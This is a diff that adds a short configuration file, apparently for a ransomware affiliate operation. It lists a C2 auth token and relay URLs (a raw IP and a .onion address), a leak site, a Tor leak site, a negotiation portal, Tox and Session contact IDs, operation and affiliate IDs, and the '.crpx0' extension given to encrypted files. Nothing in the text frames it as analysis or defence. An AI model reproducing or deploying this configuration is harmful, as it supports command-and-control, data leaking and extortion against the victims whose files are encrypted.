@@ -1,0 +1,12 @@
+C2_AUTH_TOKEN=crpx0_c2_2026
+REMOTE_URLS=
+  http://207.180.29.236:8080/relay.php
+  http://xburs4nr6cbuktokhqwefeh5hsjakz6usll5o7z5uhrfcnolakj4ptad.onion/api.php
+Leak site: https://crpx0.su
+Tor leak: http://tlxoddx4odmc2qvsmtsbgwwsv5j45osb5sox7mz6izxliuju5mkulzad.onion
+Negotiation: http://kqi5yty6ipuhwz4anutty6hob6et7dvnnxg6kcnulwedjaz5oton2zyd.onion
+Tox: 17EB54B8455144E088C7E77F88A97221C319F0CFE4FE306853EEB113EE8DB5607BB6EE481C7C
+Session: 050546f6719172e04151c31acb37a242fa3eeff5766aa57331d26cc06e83e9e25b
+OPERATION_ID=OP_1785697059
+AFFILIATE_ID=21
+ENCRYPTED_EXT=.crpx0
